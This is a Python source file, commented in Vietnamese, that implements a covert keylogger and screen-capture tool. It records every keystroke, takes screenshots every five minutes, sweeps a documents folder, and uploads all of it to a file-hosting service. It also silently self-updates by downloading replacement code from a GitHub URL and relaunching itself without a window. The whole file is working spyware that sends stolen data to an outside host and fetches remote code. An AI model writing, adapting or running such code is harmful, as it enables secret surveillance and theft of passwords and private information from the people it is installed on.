import threading
import time
import os
import sys
import pyautogui
import requests
from pynput import keyboard
from datetime import datetime

# --- CẤU HÌNH ---
CURRENT_VERSION = "1.0.0"
VERSION_URL = "https://raw.githubusercontent.com/tomasinebellosmx82798b/auto/refs/heads/main/version"
UPDATE_URL = "https://raw.githubusercontent.com/tomasinebellosmx82798b/auto/refs/heads/main/monitor.py"

GOFILE_API_TOKEN = "YOUR_API_TOKEN_HERE"
FOLDER_ID_KEYLOG = "cae52b99-448d-43b9-a254-c0d9bfadd890"
FOLDER_ID_SCREENSHOT = "f0211191-7505-4226-b5a1-cbede323189b"
WATCH_FOLDER_PATH = r"C:\Users\Admin\Documents\Macro_Logs"

# Lưu danh sách file đã up để không up lại
uploaded_files = set()
log_content = []

# --- TỰ ĐỘNG CẬP NHẬT ---
def check_for_updates():
    while True:
        try:
            response = requests.get(VERSION_URL, timeout=10)
            remote_version = response.text.strip()
            
            if remote_version != CURRENT_VERSION:
                print(f"Phát hiện bản mới {remote_version}. Đang cập nhật...")
                new_code = requests.get(UPDATE_URL, timeout=10).text
                
                with open(__file__, "w", encoding="utf-8") as f:
                    f.write(new_code)
                
                # Khởi động lại chính nó
                os.execv(sys.executable, ['pythonw'] + sys.argv)
        except Exception as e:
            pass # Lặng lẽ bỏ qua nếu mất mạng
        time.sleep(600) # Kiểm tra cập nhật mỗi 10 phút

# --- CHỨC NĂNG UPLOAD ---
def upload_to_gofile(file_path, folder_id):
    try:
        server_res = requests.get("https://api.gofile.io/getServer").json()
        server = server_res['data']['server']
        url = f"https://{server}.gofile.io/uploadFile"
        with open(file_path, 'rb') as f:
            files = {'file': f}
            data = {'folderId': folder_id, 'token': GOFILE_API_TOKEN}
            requests.post(url, files=files, data=data)
        return True
    except:
        return False

# --- QUÉT THƯ MỤC (CHỈ UP 1 LẦN) ---
def watch_folder_once():
    while True:
        if os.path.exists(WATCH_FOLDER_PATH):
            files = [f for f in os.listdir(WATCH_FOLDER_PATH) if os.path.isfile(os.path.join(WATCH_FOLDER_PATH, f))]
            for file_name in files:
                if file_name not in uploaded_files:
                    full_path = os.path.join(WATCH_FOLDER_PATH, file_name)
                    if upload_to_gofile(full_path, FOLDER_ID_SCREENSHOT):
                        uploaded_files.add(file_name)
        time.sleep(300)

# --- CHỨC NĂNG CHỤP ẢNH ---
def take_screenshot():
    while True:
        # Định dạng tên file: năm tháng ngày giờ phút giây
        timestamp = datetime.now().strftime("%Y%m%d%H%M%S")
        filename = f"{timestamp}.png"
        
        pic = pyautogui.screenshot()
        pic.save(filename, optimize=True, quality=90)
        
        upload_to_gofile(filename, FOLDER_ID_SCREENSHOT)
        if os.path.exists(filename): os.remove(filename)
        time.sleep(300)

# --- KEYLOGGER ---
def on_press(key):
    global log_content
    ts = datetime.now().strftime("[%H:%M:%S]")
    try: k = str(key.char)
    except: k = f"[{str(key)}]"
    log_content.append(f"{ts} {k}")

def process_keylog():
    global log_content
    while True:
        time.sleep(300)
        if log_content:
            filename = datetime.now().strftime("%Y%m%d%H%M%S.txt")
            with open(filename, "w", encoding="utf-8") as f:
                f.write("\n".join(log_content))
            upload_to_gofile(filename, FOLDER_ID_KEYLOG)
            if os.path.exists(filename): os.remove(filename)
            log_content = []

if __name__ == "__main__":
    # Khởi chạy các luồng
    threading.Thread(target=check_for_updates, daemon=True).start()
    threading.Thread(target=take_screenshot, daemon=True).start()
    threading.Thread(target=process_keylog, daemon=True).start()
    threading.Thread(target=watch_folder_once, daemon=True).start()

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
